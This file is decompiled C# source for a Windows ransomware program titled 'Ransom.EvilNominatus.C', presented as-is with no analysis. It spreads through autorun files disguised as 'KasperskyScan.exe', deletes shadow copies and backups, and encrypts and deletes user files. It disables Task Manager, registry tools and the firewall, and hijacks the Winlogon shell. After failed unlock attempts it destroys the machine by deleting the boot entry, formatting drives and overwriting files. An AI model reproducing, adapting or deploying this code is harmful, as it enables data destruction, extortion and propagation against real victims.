using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TRS;

public class MainForm : Form
{
	public string getDirX = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	public int live = 3;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private Button button1;

	private Label label3;

	private RichTextBox richTextBox1;

	private Label label2;

	private Label label1;

	public static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	public void EncryptDisks(string DISKLOCATION)
	{
		try
		{
			string[] files = Directory.GetFiles(DISKLOCATION + "\\", "*.*", SearchOption.AllDirectories);
			for (int i = 0; i < files.Length; i = checked(i + 1))
			{
				try
				{
					EncryptIT(files[i]);
					File.Delete(files[i]);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public MainForm()
	{
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		checked
		{
			try
			{
				runCommand("echo ^[autorun^] >autorun.inf");
				runCommand("echo ^open^=KasperskyScan^.exe >>autorun.inf");
				runCommand("echo ^execute=^KasperskyScan^.exe >>autorun.inf");
				string text = "KasperskyScan.exe";
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					try
					{
						File.Copy("autorun.inf", driveInfo.ToString());
						File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + text);
					}
					catch
					{
					}
				}
				Process.EnterDebugMode();
				runCommand("vssadmin delete shadows /all /quiet && wmic shadowcopy delete");
				MessageBox.Show("Loading please wait.... don't turn on the antivirus");
				drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo2 in drives)
				{
					try
					{
						string[] files = Directory.GetFiles(string.Concat(driveInfo2, "\\"), "*.bak", SearchOption.AllDirectories);
						for (int j = 0; j < files.Length; j++)
						{
							try
							{
								File.Delete(files[j]);
							}
							catch
							{
							}
						}
						string[] files2 = Directory.GetFiles(string.Concat(driveInfo2, "\\"), "*.*", SearchOption.AllDirectories);
						for (int j = 0; j < files2.Length; j++)
						{
							try
							{
								EncryptIT(files2[j]);
								File.Delete(files2[j]);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
					EncryptDisks(driveInfo2.ToString());
				}
				Thread.Sleep(90000);
				runCommand("taskkill /im taskmgr.exe /f");
				runCommand("assoc .png=NotSoCleverBotFile");
				runCommand("assoc .vbs=NotSoCleverBotFile");
				runCommand("assoc .html=NotSoCleverBotFile");
				runCommand("assoc .bat=NotSoCleverBotFile");
				runCommand("assoc .jpn=EncryptedFile");
				runCommand("assoc .js=exe1file");
				runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
				runCommand("ipconfig /release");
				runCommand("net stop Windows Firewall");
				runCommand("net stop Network Connections");
				using (RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"))
				{
					try
					{
						registryKey.SetValue("Shell", Application.ExecutablePath, RegistryValueKind.String);
					}
					catch
					{
					}
				}
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files3 = Directory.GetFiles(folderPath);
				string[] directories = Directory.GetDirectories(folderPath);
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files4 = Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories);
				string[] directories2 = Directory.GetDirectories(folderPath2);
				for (int k = 0; k < directories2.Length; k++)
				{
					try
					{
						MakeThemDIE(directories2[k]);
						EncryptIT(directories2[k]);
					}
					catch
					{
					}
				}
				for (int l = 0; l < files4.Length; l++)
				{
					try
					{
						EncryptIT(files4[l]);
						File.Delete(files4[l]);
					}
					catch
					{
					}
				}
				try
				{
					string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles);
					string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms);
					string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					encryptDirectory(folderPath3);
					encryptDirectory(folderPath5);
					encryptDirectory(folderPath4);
					encryptDirectory(folderPath6);
					encryptDirectory(folderPath7);
					FinalPower(folderPath3);
					FinalPower(folderPath5);
					FinalPower(folderPath4);
					FinalPower(folderPath6);
					FinalPower(folderPath7);
					string text2 = "C:\\Users\\";
					string userName = Environment.UserName;
					string location = text2 + userName + "\\Desktop";
					string location2 = text2 + userName + "\\Links";
					string location3 = text2 + userName + "\\Contacts";
					string location4 = text2 + userName + "\\Desktop";
					string location5 = text2 + userName + "\\Documents";
					string location6 = text2 + userName + "\\Downloads";
					string location7 = text2 + userName + "\\Pictures";
					string location8 = text2 + userName + "\\Music";
					string location9 = text2 + userName + "\\OneDrive";
					string location10 = text2 + userName + "\\Saved Games";
					string location11 = text2 + userName + "\\Favorites";
					string location12 = text2 + userName + "\\Searches";
					string location13 = text2 + userName + "\\Videos";
					encryptDirectory(location);
					encryptDirectory(location2);
					encryptDirectory(location3);
					encryptDirectory(location4);
					encryptDirectory(location5);
					encryptDirectory(location6);
					encryptDirectory(location7);
					encryptDirectory(location8);
					encryptDirectory(location9);
					encryptDirectory(location10);
					encryptDirectory(location11);
					encryptDirectory(location12);
					encryptDirectory(location13);
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
					string folderPath8 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
					string text3 = Path.Combine(environmentVariable, "Downloads");
					string[] files5 = Directory.GetFiles(folderPath8 + "\\", "*", SearchOption.AllDirectories);
					string[] files6 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
					for (int j = 0; j < files5.Length; j++)
					{
						try
						{
							EncryptIT(files5[j]);
							File.Delete(files5[j]);
						}
						catch
						{
						}
					}
					for (int j = 0; j < files6.Length; j++)
					{
						try
						{
							EncryptIT(files5[j]);
							File.Delete(files5[j]);
						}
						catch
						{
						}
					}
					string[] files7 = Directory.GetFiles(folderPath7 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files8 = Directory.GetFiles(folderPath6 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files9 = Directory.GetFiles(folderPath4 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files10 = Directory.GetFiles(folderPath5 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files11 = Directory.GetFiles(folderPath3 + "\\", "*.*", SearchOption.AllDirectories);
					for (int m = 0; m < files7.Length; m++)
					{
						try
						{
							EncryptIT(files7[m]);
							File.Delete(files7[m]);
						}
						catch
						{
						}
					}
					for (int n = 0; n < files8.Length; n++)
					{
						try
						{
							EncryptIT(files8[n]);
							File.Delete(files8[n]);
						}
						catch
						{
						}
					}
					for (int num = 0; num < files9.Length; num++)
					{
						try
						{
							EncryptIT(files9[num]);
							File.Delete(files9[num]);
						}
						catch
						{
						}
					}
					for (int num2 = 0; num2 < files10.Length; num2++)
					{
						try
						{
							EncryptIT(files10[num2]);
							File.Delete(files10[num2]);
						}
						catch
						{
						}
					}
					for (int num3 = 0; num3 < files11.Length; num3++)
					{
						try
						{
							EncryptIT(files10[num3]);
							File.Delete(files10[num3]);
						}
						catch
						{
						}
					}
					try
					{
						encryptDirectory(getDirX);
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
	}

	private void Label1Click(object sender, EventArgs e)
	{
	}

	private void Button1Click(object sender, EventArgs e)
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)richTextBox1).Text == "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK")
		{
			try
			{
				runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f");
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
				runCommand("explorer.exe");
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files = Directory.GetFiles(folderPath + "\\", "*.*", SearchOption.AllDirectories);
				MessageBox.Show("ransomware removed from your Computer but files still encrypted you can now contact attacker Bkhtyaryrwzbh@gmail.com to get the decrypter");
				((Form)this).Close();
				return;
			}
			catch
			{
				return;
			}
		}
		if (!(((Control)richTextBox1).Text == ((Control)richTextBox1).Text))
		{
			return;
		}
		checked
		{
			if (live == 0)
			{
				try
				{
					((Control)this).Hide();
					RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
					registryKey2.SetValue("Shell", "0", RegistryValueKind.String);
					runCommand("net users %username% 912983");
					runCommand("bcdedit /delete {current}");
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					string[] files2 = Directory.GetFiles(folderPath2, "*.*", SearchOption.AllDirectories);
					for (int i = 0; i < files2.Length; i++)
					{
						Attack1(files2[i]);
						File.Delete(files2[i]);
					}
					runCommand("assoc .vbs=INFECTEDFILE && assoc .html=INFECTEDFILE");
					DriveInfo[] drives = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo in drives)
					{
						Damage(driveInfo.ToString());
					}
					runCommand("msg * Welcome to my Nightmare");
					Thread.Sleep(30);
					runCommand("taskkill /im wininit.exe /f");
					return;
				}
				catch
				{
					return;
				}
			}
			live--;
			MessageBox.Show("Wrong! you have " + live + " chance!");
		}
	}

	public void MakeThemDIE(string Path1)
	{
		try
		{
			string userName = Environment.UserName;
		}
		catch
		{
		}
	}

	public void Attack1(string FName)
	{
		try
		{
			byte[] bytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
			File.WriteAllBytes(FName, bytes);
		}
		catch
		{
		}
	}

	public void Damage(string DriveNameToFormat)
	{
		try
		{
			string commands = "format " + DriveNameToFormat + " /FS:NTFS /X /Q /y";
			runCommand(commands);
		}
		catch
		{
		}
	}

	public void MakeThemAlive(string PathN)
	{
	}

	public void encryptDirectory(string location)
	{
		checked
		{
			try
			{
				string[] files = Directory.GetFiles(location);
				string[] directories = Directory.GetDirectories(location);
				for (int i = 0; i < files.Length; i++)
				{
					EncryptIT(files[i]);
					File.Delete(files[i]);
				}
				for (int i = 0; i < directories.Length; i++)
				{
					encryptDirectory(directories[i]);
					Directory.Delete(directories[i]);
				}
			}
			catch
			{
			}
		}
	}

	public void FinalPower(string locationPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(locationPath);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.*");
			foreach (FileInfo fileInfo in files)
			{
				EncryptIT(fileInfo.FullName);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				encryptDirectory(directoryInfo2.FullName);
			}
		}
		catch (Exception)
		{
		}
	}

	public void EncryptIT(string inputFile)
	{
		try
		{
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			string s = "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK";
			byte[] bytes = unicodeEncoding.GetBytes(s);
			string text = inputFile + "-Locked";
			string path = text;
			using (FileStream stream = new FileStream(path, FileMode.Create))
			{
				using AesManaged aesManaged = new AesManaged();
				using CryptoStream cryptoStream = new CryptoStream(stream, aesManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
				using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
				aesManaged.KeySize = 256;
				aesManaged.BlockSize = 128;
				aesManaged.Key = bytes;
				aesManaged.IV = bytes;
				aesManaged.Mode = CipherMode.CBC;
				int num;
				while ((num = fileStream.ReadByte()) != -1)
				{
					cryptoStream.WriteByte(checked((byte)num));
				}
			}
			File.Delete(inputFile + ".*");
		}
		catch
		{
		}
	}

	public void GetSystemFolder()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
	}

	public void InfectTheFile(string FileNAME1)
	{
		try
		{
			byte[] bytes = File.ReadAllBytes(Application.ExecutablePath);
			File.WriteAllBytes(FileNAME1, bytes);
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01eb: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0319: Unknown result type (might be due to invalid IL or missing references)
		//IL_0323: Expected O, but got Unknown
		//IL_0343: Unknown result type (might be due to invalid IL or missing references)
		//IL_03af: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b9: Expected O, but got Unknown
		//IL_03dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e6: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		label1 = new Label();
		richTextBox1 = new RichTextBox();
		label3 = new Label();
		button1 = new Button();
		label2 = new Label();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).BackColor = Color.Transparent;
		label1.FlatStyle = (FlatStyle)0;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = Color.DarkRed;
		((Control)label1).Location = new Point(16, 11);
		((Control)label1).Margin = new Padding(4, 0, 4, 0);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(931, 54);
		((Control)label1).TabIndex = 0;
		((Control)label1).Text = "CryptoVirus Detected!  Ransom.NominatusStrike";
		((Control)label1).Click += Label1Click;
		((Control)richTextBox1).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)richTextBox1).Location = new Point(80, 340);
		((Control)richTextBox1).Margin = new Padding(4, 4, 4, 4);
		((Control)richTextBox1).Name = "richTextBox1";
		((Control)richTextBox1).Size = new Size(409, 25);
		((Control)richTextBox1).TabIndex = 2;
		((Control)richTextBox1).Text = "";
		((Control)label3).Font = new Font("Microsoft Sans Serif", 9.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label3).Location = new Point(13, 340);
		((Control)label3).Margin = new Padding(4, 0, 4, 0);
		((Control)label3).Name = "label3";
		((Control)label3).Size = new Size(77, 30);
		((Control)label3).TabIndex = 3;
		((Control)label3).Text = "Code:";
		((ButtonBase)button1).FlatStyle = (FlatStyle)3;
		((Control)button1).Location = new Point(497, 342);
		((Control)button1).Margin = new Padding(4, 4, 4, 4);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(188, 28);
		((Control)button1).TabIndex = 4;
		((Control)button1).Text = "GO AWAY!!";
		((ButtonBase)button1).UseVisualStyleBackColor = true;
		((Control)button1).Click += Button1Click;
		((Control)label2).Font = new Font("Microsoft Sans Serif", 12.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label2).Location = new Point(20, 59);
		((Control)label2).Margin = new Padding(4, 0, 4, 0);
		((Control)label2).Name = "label2";
		((Control)label2).Size = new Size(896, 242);
		((Control)label2).TabIndex = 5;
		((Control)label2).Text = componentResourceManager.GetString("label2.Text");
		pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
		((Control)pictureBox1).Location = new Point(924, 59);
		((Control)pictureBox1).Margin = new Padding(4, 4, 4, 4);
		((Control)pictureBox1).Name = "pictureBox1";
		((Control)pictureBox1).Size = new Size(153, 148);
		pictureBox1.TabIndex = 6;
		pictureBox1.TabStop = false;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(8f, 16f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = SystemColors.AppWorkspace;
		((Form)this).ClientSize = new Size(1151, 439);
		((Form)this).ControlBox = false;
		((Control)this).Controls.Add((Control)(object)pictureBox1);
		((Control)this).Controls.Add((Control)(object)label2);
		((Control)this).Controls.Add((Control)(object)button1);
		((Control)this).Controls.Add((Control)(object)label3);
		((Control)this).Controls.Add((Control)(object)richTextBox1);
		((Control)this).Controls.Add((Control)(object)label1);
		((Form)this).Margin = new Padding(4, 4, 4, 4);
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "MainForm";
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Control)this).Text = "Ransom.EvilNominatus.C";
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
